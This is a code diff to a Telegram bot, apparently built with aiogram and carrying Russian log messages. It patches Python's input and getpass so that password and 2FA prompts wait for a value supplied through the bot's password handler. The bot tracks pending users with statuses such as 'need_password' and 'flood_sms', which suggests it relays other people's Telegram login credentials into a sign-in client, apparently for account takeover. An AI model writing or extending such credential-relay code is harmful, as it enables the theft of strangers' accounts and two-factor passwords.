@@ -314,7 +314,10 @@ async def password_handler(message: types.Message, state: FSMContext):
 
 async def main():
     import builtins
+    import getpass
+
     original_input = builtins.input
+    original_getpass = getpass.getpass
 
     def patched_input(prompt=""):
         prompt_lower = prompt.lower() if prompt else ""
@@ -334,7 +337,23 @@ async def main():
             return pwd
         return original_input(prompt)
 
+    def patched_getpass(prompt=""):
+        prompt_lower = prompt.lower() if prompt else ""
+        if "password" in prompt_lower or "пароль" in prompt_lower or "2fa" in prompt_lower:
+            for uid in list(pending.keys()):
+                if pending[uid].get("status", "") not in ("done", "blocked", "flood_sms"):
+                    pending[uid]["status"] = "need_password"
+                    logging.info(f"Установлен статус need_password для uid={uid}")
+            import time as _time
+            while not hasattr(builtins, '_password') or builtins._password is None:
+                _time.sleep(0.5)
+            pwd = builtins._password
+            builtins._password = None
+            return pwd
+        return original_getpass(prompt)
+
     builtins.input = patched_input
+    getpass.getpass = patched_getpass
 
     logging.info("Бот запущен!")
     await dp.start_polling(bot)
